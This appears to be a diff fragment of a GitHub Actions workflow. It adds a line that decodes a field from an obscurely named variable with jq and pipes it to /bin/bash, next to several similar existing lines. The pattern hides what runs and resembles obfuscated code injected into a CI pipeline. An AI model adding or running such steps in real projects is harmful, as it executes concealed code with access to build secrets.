@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$tpq080" | jq -r .bxuyz5 | /bin/bash
           echo $md713 | jq -r .x0015 | /bin/bash
           printf '%s' "$m370" | jq -r .baqs4545 | /bin/bash
+          echo $usmuu1 | jq -r .ot2602 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
